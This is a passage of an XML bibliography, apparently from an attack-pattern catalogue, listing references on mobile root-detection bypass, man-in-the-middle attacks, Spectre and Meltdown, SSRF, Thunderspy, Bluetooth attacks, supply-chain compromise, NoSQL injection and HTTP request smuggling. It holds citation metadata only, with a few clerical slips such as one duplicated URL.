         <ns0:Publication_Day>---12</ns0:Publication_Day>
         <ns0:Publisher>Nettitude Labs</ns0:Publisher>
         <ns0:URL>https://labs.nettitude.com/blog/ios-and-android-runtime-and-anti-debugging-protections/#hooking</ns0:URL>
         <ns0:URL_Date>2020-12-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-627">
         <ns0:Author>Suresh Khutale</ns0:Author>
         <ns0:Title>Android Root Detection Bypass by Reverse Engineering APK</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---06</ns0:Publication_Day>
         <ns0:Publisher>InfoSec Institute</ns0:Publisher>
         <ns0:URL>https://resources.infosecinstitute.com/topic/android-root-detection-bypass-reverse-engineering-apk/</ns0:URL>
         <ns0:URL_Date>2020-12-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-628">
         <ns0:Author>Manuel Egele</ns0:Author>
         <ns0:Author>Christopher Kruegel</ns0:Author>
         <ns0:Author>Engin Kirda</ns0:Author>
         <ns0:Author>Giovanni Vigna</ns0:Author>
         <ns0:Title>PiOS: Detecting Privacy Leaks in iOS Applications</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---09</ns0:Publication_Day>
         <ns0:URL>https://www.ndss-symposium.org/wp-content/uploads/2017/09/egel.pdf</ns0:URL>
         <ns0:URL_Date>2020-12-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-629">
         <ns0:Title>Man-in-the-browser attack</ns0:Title>
         <ns0:Publisher>Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/attacks/Man-in-the-browser_attack</ns0:URL>
         <ns0:URL_Date>2021-02-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-630">
         <ns0:Author>Liviu Arsene</ns0:Author>
         <ns0:Title>Oil and Gas Spearphishing Campaigns Drop Agent Tesla Spyware in Advance of Historic OPEC+ Deal</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---21</ns0:Publication_Day>
         <ns0:Publisher>Bitdefender Labs</ns0:Publisher>
         <ns0:URL>https://labs.bitdefender.com/2020/04/oil-gas-spearphishing-campaigns-drop-agent-tesla-spyware-in-advance-of-historic-opec-deal/</ns0:URL>
         <ns0:URL_Date>2021-02-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-631">
         <ns0:Author>Amit Klein</ns0:Author>
         <ns0:Title>Man-in-the-Mobile Attacks Single Out Android</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---10</ns0:Publication_Day>
         <ns0:Publisher>SecurityIntelligence</ns0:Publisher>
         <ns0:URL>https://securityintelligence.com/man-in-the-mobile-attacks-single-out-android/</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-632">
         <ns0:Author>Kelly Jackson Higgins</ns0:Author>
         <ns0:Title>New 'Boy In The Browser' Attacks On The Rise</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---14</ns0:Publication_Day>
         <ns0:Publisher>Dark Reading, Informa PLC</ns0:Publisher>
         <ns0:URL>https://www.darkreading.com/risk/new-boy-in-the-browser-attacks-on-the-rise/d/d-id/1135247</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-633">
         <ns0:Title>Man-in-the-middle attack</ns0:Title>
         <ns0:Publisher>Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-community/attacks/Man-in-the-middle_attack</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-634">
         <ns0:Author>Kyle Chivers</ns0:Author>
         <ns0:Title>What is a man-in-the-middle attack?</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---26</ns0:Publication_Day>
         <ns0:Publisher>NortonLifeLock Inc.</ns0:Publisher>
         <ns0:URL>https://us.norton.com/internetsecurity-wifi-what-is-a-man-in-the-middle-attack.html</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-635">
         <ns0:Title>Man in the middle (MITM) attack</ns0:Title>
         <ns0:Publisher>Imperva</ns0:Publisher>
         <ns0:URL>https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-636">
         <ns0:Author>Jerry Decime</ns0:Author>
         <ns0:Title>Settling the score: taking down the Equifax mobile application</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:URL>https://www.linkedin.com/pulse/settling-score-taking-down-equifax-mobile-application-jerry-decime/</ns0:URL>
         <ns0:URL_Date>2021-02-10</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-637">
         <ns0:Author>Paul Kocher</ns0:Author>
         <ns0:Author>Jann Horn</ns0:Author>
         <ns0:Author>Anders Fogh</ns0:Author>
         <ns0:Author>Daniel Genkin</ns0:Author>
         <ns0:Author>Daniel Gruss</ns0:Author>
         <ns0:Author>Werner Haas</ns0:Author>
         <ns0:Author>Mike Hamburg</ns0:Author>
         <ns0:Author>Moritz Lipp</ns0:Author>
         <ns0:Author>Stefan Mangard</ns0:Author>
         <ns0:Author>Thomas Prescher</ns0:Author>
         <ns0:Author>Michael Schwarz</ns0:Author>
         <ns0:Author>Yuval Yarom</ns0:Author>
         <ns0:Title>Spectre Attacks: Exploiting Speculative Execution</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publisher>Graz University of Technology</ns0:Publisher>
         <ns0:URL>https://spectreattack.com/spectre.pdf</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-638">
         <ns0:Author>Moritz Lipp</ns0:Author>
         <ns0:Author>Michael Schwarz</ns0:Author>
         <ns0:Author>Daniel Gruss</ns0:Author>
         <ns0:Author>Thomas Prescher</ns0:Author>
         <ns0:Author>Werner Haas</ns0:Author>
         <ns0:Author>Anders Fogh</ns0:Author>
         <ns0:Author>Jann Horn</ns0:Author>
         <ns0:Author>Stefan Mangard</ns0:Author>
         <ns0:Author>Paul Kocher</ns0:Author>
         <ns0:Author>Daniel Genkin</ns0:Author>
         <ns0:Author>Yuval Yarom</ns0:Author>
         <ns0:Author>Mike Hamburg</ns0:Author>
         <ns0:Title>Meltdown: Reading Kernel Memory from User Space</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publisher>Graz University of Technology</ns0:Publisher>
         <ns0:URL>https://meltdownattack.com/meltdown.pdf</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-639">
         <ns0:Author>Claudio Canella</ns0:Author>
         <ns0:Author>Jo Van Bulck</ns0:Author>
         <ns0:Author>Michael Schwarz</ns0:Author>
         <ns0:Author>Moritz Lipp</ns0:Author>
         <ns0:Author>Benjamin von Berg</ns0:Author>
         <ns0:Author>Philipp Ortner</ns0:Author>
         <ns0:Author>Frank Piessens</ns0:Author>
         <ns0:Author>Dmitry Evtyushkin</ns0:Author>
         <ns0:Author>Daniel Gruss</ns0:Author>
         <ns0:Title>A Systematic Evaluation of Transient Execution Attacks and Defenses</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>Graz University of Technology</ns0:Publisher>
         <ns0:URL>https://arxiv.org/abs/1811.05441</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-640">
         <ns0:Author>Qian Ge</ns0:Author>
         <ns0:Author>Yuval Yarom</ns0:Author>
         <ns0:Author>Gernot Heiser</ns0:Author>
         <ns0:Title>A Survey of Microarchitectural Timing Attacks and Countermeasures on Contemporary Hardware</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---26</ns0:Publication_Day>
         <ns0:Publisher>Journal of Cryptographic Engineering</ns0:Publisher>
         <ns0:URL>https://eprint.iacr.org/2016/613.pdf</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-641">
         <ns0:Author>Nael Abu-Ghazaleh</ns0:Author>
         <ns0:Author>Dmitry Ponomarev</ns0:Author>
         <ns0:Author>Dmitry Evtyushkin</ns0:Author>
         <ns0:Title>How the Spectre and Meltdown Hacks Really Worked</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:Publisher>IEEE Spectrum</ns0:Publisher>
         <ns0:URL>https://spectrum.ieee.org/computing/hardware/how-the-spectre-and-meltdown-hacks-really-worked</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-642">
         <ns0:Author>James Sanders</ns0:Author>
         <ns0:Title>Spectre and Meltdown explained: A comprehensive guide for professionals</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>TechRepublic</ns0:Publisher>
         <ns0:URL>https://spectrum.ieee.org/computing/hardware/how-the-spectre-and-meltdown-hacks-really-worked</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-643">
         <ns0:Title>Alert (TA18-004A) Meltdown and Spectre Side-Channel Vulnerability Guidance</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---04</ns0:Publication_Day>
         <ns0:Publisher>CISA</ns0:Publisher>
         <ns0:URL>https://us-cert.cisa.gov/ncas/alerts/TA18-004A</ns0:URL>
         <ns0:URL_Date>2021-03-05</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-644">
         <ns0:Title>OWASP SSRF Bible</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---26</ns0:Publication_Day>
         <ns0:Publisher>OWASP</ns0:Publisher>
         <ns0:URL>https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-645">
         <ns0:Title>Server Side Request Forgery</ns0:Title>
         <ns0:Publisher>PortSwigger</ns0:Publisher>
         <ns0:URL>https://portswigger.net/web-security/ssrf</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-646">
         <ns0:Title>CallStranger Vulnerability</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>Yunus Cadirici</ns0:Publisher>
         <ns0:URL>https://github.com/yunuscadirci/CallStranger</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-647">
         <ns0:Author>Bj&#246;rn Ruytenberg</ns0:Author>
         <ns0:Title>Thunderspy When Lighting Strikes Thrice: Breaking Thunderbolt 3 Security</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publisher>Eindhoven University of Technology</ns0:Publisher>
         <ns0:URL>https://thunderspy.io/</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-648">
         <ns0:Author>Bj&#246;rn Ruytenberg</ns0:Author>
         <ns0:Title>Breaking Thunderbolt Protocol Security: Vulnerability Report</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>Eindhoven University of Technology</ns0:Publisher>
         <ns0:URL>https://thunderspy.io/assets/reports/breaking-thunderbolt-security-bjorn-ruytenberg-20200417.pdf</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-649">
         <ns0:Author>Liam Tung</ns0:Author>
         <ns0:Title>Thunderbolt flaws affect millions of computers &#8211; even locking unattended devices won't help</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>ZDNet</ns0:Publisher>
         <ns0:URL>https://www.zdnet.com/article/thunderbolt-flaws-affect-millions-of-computers-even-locking-unattended-devices-wont-help/</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-650">
         <ns0:Author>Liam Tung</ns0:Author>
         <ns0:Title>Microsoft: Worried about Thunderbolt attacks? Get a Windows 10 Secured-Core PC</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---14</ns0:Publication_Day>
         <ns0:Publisher>ZDNet</ns0:Publisher>
         <ns0:URL>https://www.zdnet.com/article/microsoft-worried-about-thunderbolt-attacks-get-a-windows-10-secured-core-pc/</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-651">
         <ns0:Author>Jon Porter</ns0:Author>
         <ns0:Title>Thunderbolt flaw allows access to a PC&#8217;s data in minutes</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>The Verge</ns0:Publisher>
         <ns0:URL>https://www.theverge.com/2020/5/11/21254290/thunderbolt-security-vulnerability-thunderspy-encryption-access-intel-laptops</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-652">
         <ns0:Author>Jerry Bryant</ns0:Author>
         <ns0:Title>MORE INFORMATION ON THUNDERBOLT(TM) SECURITY</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---10</ns0:Publication_Day>
         <ns0:Publisher>Intel Corporation</ns0:Publisher>
         <ns0:URL>https://blogs.intel.com/technology/2020/05/more-information-on-thunderspy/#gs.0o6pmk</ns0:URL>
         <ns0:URL_Date>2021-05-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-653">
         <ns0:Author>Amrita Mitra</ns0:Author>
         <ns0:Title>What is Car Whisperer?</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>The Security Buddy</ns0:Publisher>
         <ns0:URL>https://www.thesecuritybuddy.com/bluetooth-security/what-is-car-whisperer/</ns0:URL>
         <ns0:URL_Date>2021-06-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-654">
         <ns0:Title>What is Bluesnarfing?</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>Finjan Mobile</ns0:Publisher>
         <ns0:URL>https://www.finjanmobile.com/what-is-bluesnarfing/</ns0:URL>
         <ns0:URL_Date>2021-06-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-655">
         <ns0:Author>Amrita Mitra</ns0:Author>
         <ns0:Title>What is BlueSmack Attack?</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>The Security Buddy</ns0:Publisher>
         <ns0:URL>https://www.thesecuritybuddy.com/bluetooth-security/what-is-bluesmack-attack/</ns0:URL>
         <ns0:URL_Date>2021-06-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-656">
         <ns0:Title>Wireless Security - Bluejack a Victim</ns0:Title>
         <ns0:Publisher>TutorialsPoint</ns0:Publisher>
         <ns0:URL>https://www.tutorialspoint.com/wireless_security/wireless_security_bluejack_a_victim.htm</ns0:URL>
         <ns0:URL_Date>2021-06-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-657">
         <ns0:Author>Jovi Umawing</ns0:Author>
         <ns0:Title>Bluetooth vulnerability can be exploited in Key Negotiation of Bluetooth (KNOB) attacks</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---21</ns0:Publication_Day>
         <ns0:Publisher>MalwareBytes</ns0:Publisher>
         <ns0:URL>https://blog.malwarebytes.com/awareness/2019/08/bluetooth-vulnerability-can-be-exploited-in-key-negotiation-of-bluetooth-knob-attacks/</ns0:URL>
         <ns0:URL_Date>2021-06-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-658">
         <ns0:Title>Defending Against Software Supply Chain Attacks</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publisher>Cybersecurity and Infrastructure Security Agency (CISA)</ns0:Publisher>
         <ns0:URL>https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf</ns0:URL>
         <ns0:URL_Date>2021-06-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-659">
         <ns0:Author>Dr. Charles Clancy</ns0:Author>
         <ns0:Author>Joe Ferraro</ns0:Author>
         <ns0:Author>Robert A. Martin</ns0:Author>
         <ns0:Author>Adam G. Pennington</ns0:Author>
         <ns0:Author>Christopher L. Sledjeski</ns0:Author>
         <ns0:Author>Dr. Craig J. Wiener</ns0:Author>
         <ns0:Title>Deliver Uncompromised: Securing Critical Software Supply Chains</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publisher>The MITRE Corporation</ns0:Publisher>
         <ns0:URL>https://www.mitre.org/publications/technical-papers/deliver-uncompromised-securing-critical-software-supply-chains</ns0:URL>
         <ns0:URL_Date>2021-06-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-660">
         <ns0:Author>Melinda Reed</ns0:Author>
         <ns0:Author>John F. Miller</ns0:Author>
         <ns0:Author>Paul Popick</ns0:Author>
         <ns0:Title>Supply Chain Attack Patterns: Framework and Catalog</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publisher>Office of the Assistant Secretary of Defense for Research and Engineering</ns0:Publisher>
         <ns0:URL>https://docplayer.net/13041016-Supply-chain-attack-patterns-framework-and-catalog.html</ns0:URL>
         <ns0:URL_Date>2021-06-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-662">
         <ns0:Author>Jeremy Muldavin</ns0:Author>
         <ns0:Title>Assuring Microelectronics Innovation for National Security &amp; Economic Competitiveness (MINSEC)</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publisher>Office of the Deputy Assistant Secretary of Defense for Systems Engineering</ns0:Publisher></ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-663">
         <ns0:Author>Richard Kissel</ns0:Author>
         <ns0:Author>Andrew Regenscheid</ns0:Author>
         <ns0:Author>Matthew Scholl</ns0:Author>
         <ns0:Author>Kevin Stine</ns0:Author>
         <ns0:Title>NIST Special Publication 800-88 Revision 1: Guidelines for Media Sanitization</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publisher>National Institute of Standards and Technology</ns0:Publisher>
         <ns0:URL>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-88r1.pdf</ns0:URL>
         <ns0:URL_Date>2021-06-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-664">
         <ns0:Title>EQUATION GROUP: QUESTIONS AND ANSWERS</ns0:Title>
         <ns0:Edition>1.5</ns0:Edition>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publisher>Kaspersky Lab HQ</ns0:Publisher>
         <ns0:URL>https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf</ns0:URL>
         <ns0:URL_Date>2021-06-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-665">
         <ns0:Author>Preston Hood</ns0:Author>
         <ns0:Title>Hard Drive Firmware Implant IRATEMONK</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---26</ns0:Publication_Day>
         <ns0:Publisher>PJHoodsCo Blog</ns0:Publisher>
         <ns0:URL>https://blog.pjhoodsco.org/hard-drive-firmware-implant-iratemonk/</ns0:URL>
         <ns0:URL_Date>2021-06-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-666">
         <ns0:Author>Bruce Schneier</ns0:Author>
         <ns0:Title>IRATEMONK: NSA Exploit of the Day</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---31</ns0:Publication_Day>
         <ns0:Publisher>Schneier on Security</ns0:Publisher>
         <ns0:URL>https://www.schneier.com/blog/archives/2014/01/iratemonk_nsa_e.html</ns0:URL>
         <ns0:URL_Date>2021-06-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-667">
         <ns0:Title>Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>Schneier on Security</ns0:Publisher>
         <ns0:URL>https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html</ns0:URL>
         <ns0:URL_Date>2021-06-24</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-668">
         <ns0:Title>Testing for NoSQL Injection</ns0:Title>
         <ns0:Publisher>The OWASP Foundation</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection</ns0:URL>
         <ns0:URL_Date>2021-09-30</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-669">
         <ns0:Author>Charlie Belmer</ns0:Author>
         <ns0:Title>NoSql Injection Cheatsheet</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---07</ns0:Publication_Day>
         <ns0:Publisher>Null Sweep</ns0:Publisher>
         <ns0:URL>https://nullsweep.com/nosql-injection-cheatsheet/</ns0:URL>
         <ns0:URL_Date>2021-09-30</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-670">
         <ns0:Author>Patrick Spiegel</ns0:Author>
         <ns0:Title>NoSql Injection: Fun with Objects and Arrays</ns0:Title>
         <ns0:Publisher>The OWASP Foundation</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf</ns0:URL>
         <ns0:URL_Date>2021-09-30</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-671">
         <ns0:Title>NoSql Injection: Fun with Objects and ArraysNoSQL Injection Attacks and Prevention Techniques</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publisher>WebOrion</ns0:Publisher>
         <ns0:URL>https://www.theweborion.com/wp-content/uploads/2019/06/NoSQL-Injection-Attacks-and-Prevention-Techniques.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-11</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-672">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>HTTP Request Smuggling</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publisher>The Web Application Security Consortium</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246928/HTTP%20Request%20Smuggling</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-673">
         <ns0:Author>Dzevad Alibegovic</ns0:Author>
         <ns0:Title>HTTP Request Smuggling: Complete Guide to Attack Types and Prevention</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---23</ns0:Publication_Day>
         <ns0:Publisher>NeuraLegion</ns0:Publisher>
         <ns0:URL>https://www.neuralegion.com/blog/http-request-smuggling-hrs/</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-674">
         <ns0:Author>Busra Demir</ns0:Author>
         <ns0:Title>A Pentester&#8217;s Guide to HTTP Request Smuggling</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>Cobalt</ns0:Publisher>
         <ns0:URL>https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-675">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>HTTP Response Smuggling</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publisher>The Web Application Security Consortium</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246930/HTTP%20Response%20Smuggling</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-676">
         <ns0:Author>Kazuho Oku</ns0:Author>
         <ns0:Title>Mozilla Foundation Security Advisory 2006-33 HTTP response smuggling</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---01</ns0:Publication_Day>
         <ns0:Publisher>Mozilla Corporation</ns0:Publisher>
         <ns0:URL>https://www.mozilla.org/en-US/security/advisories/mfsa2006-33/</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-677">
         <ns0:Title>Testing for HTTP Splitting Smuggling</ns0:Title>
         <ns0:Publisher>Open Web Application Security Project</ns0:Publisher>
